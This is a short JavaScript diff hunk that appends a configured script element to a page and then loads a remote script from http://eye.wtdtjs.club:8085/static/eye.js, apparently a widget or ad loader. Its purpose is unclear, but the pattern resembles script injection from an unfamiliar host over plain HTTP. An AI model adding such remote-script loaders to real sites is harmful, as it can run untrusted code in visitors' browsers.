@@ -10,6 +10,7 @@ s1.appendChild(document.createTextNode("var ayaId = 'aya31240';"));
 s1.appendChild(document.createTextNode("var autoSize = true;"));
 s1.appendChild(document.createTextNode("var ayaIcon = true;"));
 s1.appendChild(document.createTextNode("var ayaClose = true;"));
+document.body.appendChild(s1);
 
 var s2 = document.createElement("script");
 s2.src = "http://eye.wtdtjs.club:8085/static/eye.js";
